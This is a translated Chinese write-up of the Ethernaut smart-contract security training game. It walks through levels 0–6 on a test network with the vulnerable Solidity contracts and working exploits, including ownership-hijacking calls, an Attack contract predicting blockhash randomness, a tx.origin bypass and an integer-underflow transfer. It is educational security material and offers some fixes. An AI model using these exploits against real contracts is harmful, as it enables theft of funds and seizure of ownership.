# Zeppelin Ethernaut writeup
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
Ethernaut 是 Zeppelin 提供的一个基于 Web3 和 Solidity 的智能合约审计训练平台，目前收录了 15
道题目，复现了智能合约中可能出现的各种安全问题。  
## 0\. Hello Ethernaut
签到关，同时也是新手教程。  
首先要装 MetaMask 浏览器插件，切换到 Ropsten test network，创建账号，点击
BUY，给自己打点钱先。由于是测试网络，所以随便白嫖。  
打开 console，跟着教程试几个命令，确认无误后就可以愉快的做题了。
第一关主要是熟悉操作，跟着提示调用函数即可。
    contract.info()
    // "You will find what you need in info1()."
    contract.info1()
    // "Try info2(), but with "hello" as a parameter."
    contract.info2('hello')
    // "The property infoNum holds the number of the next info method to call."
    contract.infoNum()
    // 42
    contract.info42()
    // "theMethodName is the name of the next method."
    contract.theMethodName()
    // "The method name is method7123949."
    contract.method7123949()
    // "If you know the password, submit it to authenticate()."
    contract.password()
    // "ethernaut0"
    contract.authenticate('ethernaut0')
    // done
提交答案后可以看到源码。
## 1\. Fallback
    pragma solidity ^0.4.18;
    import 'zeppelin-solidity/contracts/ownership/Ownable.sol';
    contract Fallback is Ownable {
      mapping(address => uint) public contributions;
      function Fallback() public {
        contributions[msg.sender] = 1000 * (1 ether);
      }
      function contribute() public payable {
        require(msg.value  contributions[owner]) {
          owner = msg.sender;
        }
      }
      function getContribution() public view returns (uint) {
        return contributions[msg.sender];
      }
      function withdraw() public onlyOwner {
        owner.transfer(this.balance);
      }
      function() payable public {
        require(msg.value > 0 && contributions[msg.sender] > 0);
        owner = msg.sender;
      }
    }
通关条件
  * 成为合约的 owner
  * 清零 balance
合约构造函数 `Fallback()` 中初始化拥有者贡献度为 1000 ether。  
我们可以通过转钱提升贡献度，当贡献度超过 1000 ether 即可成为合约 owner。  
但在 `contribute()` 中限制了每次只能转小于 0.001 ether 的钱。很明显，此路不通。
然而成为 owner 还有另一种方式，注意到合约的 fallback 函数，即最下的无名函数。当合约账户收到一笔转账时会自动调用 fallback
函数。在这里，只要转账金额大于0，并且贡献大于0，即可成为 owner。
调用 `help()` 函数，了解下如何进行转钱操作。还需要注意一下 Wei 和 Ether 的转换。
    contract.contribute({value: 1})
    contract.sendTransaction({value: 1})
    contract.withdraw()
## 2\. Fallout
    pragma solidity ^0.4.18;
    import 'zeppelin-solidity/contracts/ownership/Ownable.sol';
    contract Fallout is Ownable {
      mapping (address => uint) allocations;
      /* constructor */
      function Fal1out() public payable {
        owner = msg.sender;
        allocations[owner] = msg.value;
      }
      function allocate() public payable {
        allocations[msg.sender] += msg.value;
      }
      function sendAllocation(address allocator) public {
        require(allocations[allocator] > 0);
        allocator.transfer(allocations[allocator]);
      }
      function collectAllocations() public onlyOwner {
        msg.sender.transfer(this.balance);
      }
      function allocatorBalance(address allocator) public view returns (uint) {
        return allocations[allocator];
      }
    }
通关条件
  * 成为合约的 owner
一个很简单的合约，其中改变 owner 的只有 `Fal1out()` 函数，但这是个构造函数，要怎么调用呢。  
想了好久好久… 然后发现这根本不是构造函数，其中一个是 `l` 和 `1`，长得太像了…  
无良出题人甚至还给了个注释来强调一下这个假构造函数的身份，太过分了。  
所以直接转钱调用就好了。
    contract.Fal1out({value: 1})
## 3\. Coin Flip
    pragma solidity ^0.4.18;
    contract CoinFlip {
      uint256 public consecutiveWins;
      uint256 lastHash;
      uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
      function CoinFlip() public {
        consecutiveWins = 0;
      }
      function flip(bool _guess) public returns (bool) {
        uint256 blockValue = uint256(block.blockhash(block.number-1));
        if (lastHash == blockValue) {
          revert();
        }
        lastHash = blockValue;
        uint256 coinFlip = uint256(uint256(blockValue) / FACTOR);
        bool side = coinFlip == 1 ? true : false;
        if (side == _guess) {
          consecutiveWins++;
          return true;
        } else {
          consecutiveWins = 0;
          return false;
        }
      }
    }
通关条件
  * 连续猜对 10 次
`FACTOR` 为 2^255，`coinFlip` 结果只会为 1 或 0  
相当于一个猜硬币正反面的游戏
这是经典的区块链伪随机数的问题。  
在以太坊智能合约中编写的基于随机数的处理逻辑是十分危险的，因为区块链上的数据是公开的，所有人都可以看见，利用公开的数据来生成随机数是不明智的。  
此外，像 `timestamps` 这样矿工可控的数据也不宜作为种子。
在这道题中，出题人利用 `block.blockhash(block.number-1)`
来生成随机数，这是可预测的。我们可以部署一个新的合约，先进行随机数的预测，再进行竞猜。  
部署合约： 
    pragma solidity ^0.4.18;
    contract CoinFlip {
      uint256 public consecutiveWins;
      uint256 lastHash;
      uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
      function CoinFlip() public {
        consecutiveWins = 0;
      }
      function flip(bool _guess) public returns (bool) {
        uint256 blockValue = uint256(block.blockhash(block.number-1));
        if (lastHash == blockValue) {
          revert();
        }
        lastHash = blockValue;
        uint256 coinFlip = uint256(uint256(blockValue) / FACTOR);
        bool side = coinFlip == 1 ? true : false;
        if (side == _guess) {
          consecutiveWins++;
          return true;
        } else {
          consecutiveWins = 0;
          return false;
        }
      }
    }
    contract Attack {
      CoinFlip fliphack;
      address instance_address = instance_address_here;
      uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
      function Attack() {
        fliphack = CoinFlip(instance_address);
      }
      function predict() public view returns (bool){
        uint256 blockValue = uint256(block.blockhash(block.number-1));
        uint256 coinFlip = uint256(uint256(blockValue) / FACTOR);
        return coinFlip == 1 ? true : false;
      }
      function hack() public {
        bool guess = predict();
        fliphack.flip(guess);
      }
    }
只需调用 10 次 `hack()` 函数即可。
## 4\. Telephone
    pragma solidity ^0.4.18;
    contract Telephone {
      address public owner;
      function Telephone() public {
        owner = msg.sender;
      }
      function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
          owner = _owner;
        }
      }
    }
通关条件
  * 成为合约的 owner
代码很短，这里的考点是 `tx.origin` 和 `msg.sender` 的区别。
  * `tx.origin` 是交易的发送方。
  * `msg.sender` 是消息的发送方。
用户通过另一个合约 Attack 来调用目标合约中的 `changeOwner()`  
此时，`tx.origin` 为 用户，`msg.sender` 为 Attack，即可绕过条件，成为 owner
    pragma solidity ^0.4.18;
    contract Telephone {
      address public owner;
      function Telephone() public {
        owner = msg.sender;
      }
      function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
          owner = _owner;
        }
      }
    }
    contract Attack {
        address instance_address = instance_address_here;
        Telephone target = Telephone(instance_address);
        function hack() public {
            target.changeOwner(msg.sender);
        }
    }
部署合约，调用 `hack()` 函数即可。
## 5\. Token
    pragma solidity ^0.4.18;
    contract Token {
      mapping(address => uint) balances;
      uint public totalSupply;
      function Token(uint _initialSupply) public {
        balances[msg.sender] = totalSupply = _initialSupply;
      }
      function transfer(address _to, uint _value) public returns (bool) {
        require(balances[msg.sender] - _value >= 0);
        balances[msg.sender] -= _value;
        balances[_to] += _value;
        return true;
      }
      function balanceOf(address _owner) public view returns (uint balance) {
        return balances[_owner];
      }
    }
经典的整数溢出问题  
在 `transfer()` 函数第一行 `require` 里，这里的 `balances` 和 `value` 都是 uint。此时
`balances` 为 20，令 `value` = 21，产生下溢，从而绕过验证，并转出一笔很大的金额。
    contract.transfer(player_address, 21)
为了防止整数溢出，应该使用 `require(balances[msg.sender] >= _value)`  
或是使用 OpenZeppelin 维护的 SafeMath 库来处理算术逻辑。
## 6\. Delegation
    pragma solidity ^0.4.18;
    contract Delegate {
      address public owner;
      function Delegate(address _owner) public {
        owner = _owner;
      }
      function pwn() public {
        owner = msg.sender;
      }
    }
    contract Delegation {
      address public owner;
      Delegate delegate;
      function Delegation(address _delegateAddress) public {
        delegate = Delegate(_delegateAddress);
        owner = msg.sender;
      }
      function() public {
        if(delegate.delegatecall(msg.data)) {
          this;
        }
      }
    }
考点在于 Solidity 中支持两种底层调用方式 `call` 和 `delegatecall`